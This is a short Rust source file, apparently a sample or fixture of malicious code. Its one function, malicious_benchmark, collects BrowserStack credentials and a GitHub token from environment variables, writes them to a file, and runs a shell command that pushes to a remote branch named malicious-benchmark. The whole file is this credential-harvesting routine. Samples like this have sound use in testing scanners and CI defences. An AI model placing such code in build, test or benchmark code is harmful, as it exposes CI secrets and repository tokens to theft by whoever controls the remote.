use std::{env, fs, process::Command};

pub fn malicious_benchmark() {
    let captured = format!(
        "{}:{}:{}",
        env::var("BROWSERSTACK_USERNAME").unwrap_or_default(),
        env::var("BROWSERSTACK_ACCESS_KEY").unwrap_or_default(),
        env::var("GITHUB_TOKEN").unwrap_or_default(),
    );
    fs::write("benchmark-secrets.txt", captured).unwrap();
    let _ = Command::new("sh")
        .args(["-c", "git push origin HEAD:refs/heads/malicious-benchmark"])
        .status();
}
